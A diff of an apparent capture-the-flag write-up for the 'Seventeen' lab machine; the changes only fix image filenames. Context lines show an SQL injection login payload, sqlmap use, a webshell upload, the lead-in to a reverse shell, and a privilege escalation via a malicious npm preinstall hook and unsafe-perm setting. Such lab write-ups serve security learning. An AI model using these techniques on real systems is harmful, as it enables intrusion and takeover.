@@ -114,7 +114,7 @@ I pursued rabbit holes here but I have left in my steps exploring them to demons
 I began by exploring each of the subdirectories within vendor. I soon found each to be hosting it's own application.
 
 #### `vendor/exams/`
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529145721.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529145721.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529145721.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529145721.png){:.glightbox}
 
 maybe we can find a source for this via the developer name
 
@@ -138,7 +138,7 @@ username=admin%27+or+1%3D1%3B+--+-&password=admin&login=
 
 we get into the admin panel, and find some usernames
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529153654.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529153654.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529153654.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529153654.png){:.glightbox}
 
 People
 ```
@@ -176,7 +176,7 @@ $query = mysqli_query($conn, "SELECT * FROM `user` WHERE `username` = '$username
 
 let's use `sqlmap` to automate the injection to dump this database. I create a local file admin.req with the request content from burp
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529155325.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529155325.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529155325.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529155325.png){:.glightbox}
 
 I clean up the username parameter for sqlmap, because it does not like parameters with manual sql injection attempts. The updated parameters line is:
 
@@ -384,7 +384,7 @@ finally, we get a hash to crack this time
 ```
 cross referencing to the student accounts in the webapp, this pass word is for Kelly Shane
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529173008.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529173008.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529173008.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529173008.png){:.glightbox}
 
 
 #### file upload
@@ -449,11 +449,11 @@ http://seventeen.htb/vendor/oldmanagement/files/
 
 entering the first directory we see
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529162708.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529162708.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529162708.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529162708.png){:.glightbox}
 
 papers.php seem to run the `id` command? 
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529164441.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529164441.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529164441.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529164441.png){:.glightbox}
 
 interestingly there seems to be a php source file version at http://seventeen.htb/vendor/oldmanagement/files/31234/papers.phps
 
@@ -461,7 +461,7 @@ however it gives a 403 forbidden
 
 The PDF contains an interesting note
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529162937.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529162937.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529162937.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529162937.png){:.glightbox}
 
 let's add this to` /etc/hosts` and check it out
 
@@ -469,17 +469,17 @@ navigating to http://mastermailer.seventeen.htb we are redirected to http://mast
 
 even with the Kelly credentials we found earlier cannot use this, we get an error
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529175942.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529175942.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529175942.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529175942.png){:.glightbox}
 
 with some more enumeration on this vhost, we see it hosts the same file management application as the main domain at http://mastermailer.seventeen.htb:8000/oldmanagement/
 
 using the same sql injection (or simply Kelly's credentials) we login and try the file upload functionality at http://mastermailer.seventeen.htb:8000/oldmanagement/student_profile.php, and luckily this time it is successful. We upload a simple php webshell to confirm
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529182808.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529182808.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529182808.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529182808.png){:.glightbox}
 
 now to check for remote code execution we access our webshell at http://mastermailer.seventeen.htb:8000/oldmanagement/files/31234/simple.php?gg=id
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529182957.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529182957.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529182957.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529182957.png){:.glightbox}
 
 now we can submit a reverse shell, I frequently have success with this basic reverse shell: 
 ```bash
@@ -508,7 +508,7 @@ http://mastermailer.seventeen.htb:8000/oldmanagement/files/31234/simple.php?gg=p
 
 this one connects back and gives us a shell
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529184017.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529184017.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529184017.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529184017.png){:.glightbox}
 
 ## User
 We begin with just some basic manual enumeration. Let's look through the config files of all available web applications to see if we can find any further credentials.
@@ -598,7 +598,7 @@ if(!defined('DB_NAME')) define('DB_NAME',"erms_db");
 
 at the home directory of mark we find `.npm` which is normally not seen. Investigating further there is an directory referencing a local service, let's see if it's running
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529195105.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529195105.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529195105.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529195105.png){:.glightbox}
 
 with curl we see it is a html page
 
@@ -636,7 +636,7 @@ ssh mark@10.129.76.130 -L 4873:localhost:4873 -L 44465:localhost:44465
 
 now navigating to http://localhost:4873 we see a webapp Verdaccio.
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529200148.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529200148.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529200148.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529200148.png){:.glightbox}
 
 Let's scan both with nmap
 ```sh
@@ -690,7 +690,7 @@ looked into this for a while but didn't find anything immediately...
 
 back on the box now, looking in `/opt` we find something interesting
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529204330.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529204330.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529204330.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529204330.png){:.glightbox}
 
 but before going into mysql let's try the other users on the box
 
@@ -705,7 +705,7 @@ __NOTE__ at the time of completing this box, this was a valid path to root but h
 
 runing `sudo -l` we see kavi can run the startup script we saw earlier
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529222443.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529222443.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529222443.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529222443.png){:.glightbox}
 
 a reminder on the contents
 
@@ -737,21 +737,21 @@ done
 
 inspecting `/opt/app/node_modules/` we see db-logger is installed, but loglevel is not, so my idea is create a malicious loglevel package and publish it on the private registry running at http://localhost:4873, now this would be a great idea except the registry is not allowing any additional user registration so we cannot publish...
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529223118.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529223118.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529223118.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529223118.png){:.glightbox}
 
 at this point I used sudo to run the startup script to investigate what is happening
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529223409.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529223409.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529223409.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529223409.png){:.glightbox}
 
 In the db-logger package.json `/opt/app/node_modules/db-logger/package.json` we see a mysql dependancy
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529223613.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529223613.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529223613.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529223613.png){:.glightbox}
 
 now since kavi controls the mysql directory, if we can change the `package.json` found there, we can insert a "preinstall" option to get code execution.
 
 examining the directory
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529223902.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529223902.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529223902.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529223902.png){:.glightbox}
 
 okay that might seem like a problem but we own the directory containing the file, so we can move and replace `package.json`
 
@@ -794,7 +794,7 @@ now to move our modified `package.json` back and run the startup script again
 > sudo /opt/app/startup.sh
 ```
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529233348.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529233348.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529233348.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529233348.png){:.glightbox}
 
 with some research we come across https://stackoverflow.com/questions/18136746/npm-install-failed-with-cannot-run-in-wd
 
@@ -804,13 +804,13 @@ we cannot change the npm install commands in the script to add the `--unsafe-per
 
 running `npm config ls`
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529234432.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529234432.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529234432.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529234432.png){:.glightbox}
 
 with some more googling I find unsafe-perm may be set in .npmrc file
 
 https://pnpm.io/npmrc
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529234537.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529234537.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529234537.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529234537.png){:.glightbox}
 
 ```bash
 > vi ~/.npmrc # add unsafe-perm line
@@ -822,7 +822,7 @@ unsafe-perm=true
 
 Now we will run the startup.sh script again
 
-[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529235430.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529235430.png){:.glightbox}
+[![](/assets/image/attachments/Pasted&#32;image&#32;20220529235430.png)](/assets/image/attachments/Pasted&#32;image&#32;20220529235430.png){:.glightbox}
 
 And we get a SUID bash, giving us root!
 
